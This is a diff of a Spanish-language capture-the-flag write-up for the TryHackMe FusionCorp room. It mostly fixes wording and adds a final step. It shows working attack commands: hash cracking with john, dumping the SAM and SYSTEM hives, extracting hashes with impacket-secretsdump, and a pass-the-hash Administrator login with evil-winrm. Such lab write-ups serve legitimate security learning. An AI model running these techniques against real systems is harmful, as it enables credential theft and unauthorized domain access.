@@ -163,7 +163,7 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
 
       ![image](https://github.com/Esevka/CTF/assets/139042999/858ac63d-ad88-45ca-97ba-8c5c99ba2813)
 
-    4)Intentamos crakear el hash del usuario lparker con john y asi obtener unas credenciales validad para intenter conectarnos por los demas servicios expuestos.
+    4)Intentamos crakear el hash del usuario lparker con john y asi obtener unas credenciales validas para intenter conectarnos por los demas servicios expuestos.
 
         ┌──(root㉿kali)-[/home/…/ctf/try_ctf/FusionCorp/content]
         └─# john hashuser_NP --wordlist=/usr/share/wordlists/rockyou.txt 
@@ -371,14 +371,14 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
 
 -Elevamos privilegios.
 
-  - INTENTAMOS, Obtenemos una copia de SAM y SYSTEM del registro de windows donde obtenemos hashes de usuario para posteriormente intentamos crakearlo (NO FUNCIONA)
-         Dumpeamos SAM Y SYSTEM del registro de windows.
+  - No funciona, Obtenemos una copia de SAM y SYSTEM del registro de windows donde obtenemos hashes de usuario para posteriormente intentar crakearlos.
+    
+         -Dumpeamos SAM Y SYSTEM del registro de windows.
      
            reg save hklm\system system
            reg save hklm\sam sam
 
-
-         Extraemos los hash del fichero SAM
+         -Extraemos los hash del fichero SAM
 
            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
           └─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
@@ -399,7 +399,7 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
            El archivo "C:\Windows\NTDS\ntds.dit" (Base de datos de Active Directory)
            es un componente crítico de la base de datos de Microsoft Windows Active Directory.
            Active Directory es un servicio de directorio utilizado por servidores Windows para almacenar
-           información sobre objetos en una red, como cuentas de usuario, cuentas de computadoras y pertenencias a grupos.
+           información sobre objetos en una red, cuentas de usuario, cuentas de computadoras y pertenencias a grupos.
 
     Informacion del ataque a realizar:
     
@@ -583,7 +583,27 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
             fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
             fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
             fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
-            [*] Cleaning up... 
+            [*] Cleaning up...
+        
+        5)Conectamos como Administrator.
+
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+            └─# evil-winrm -i fusion.corp -u Administrator -H '9653b02d945329c7270525c4c2a69c67'
+                                                    
+            Evil-WinRM shell v3.5                                      
+            Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                        
+            Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                                    
+            Info: Establishing connection to remote endpoint
+            *Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+        -Obtenemos Flag(User3)
+
+            *Evil-WinRM* PS C:\Users\Administrator> type .\Desktop\flag.txt
+            THM{f72988e57bfc1de----------0464d15}
+
+
+        
 
 
         
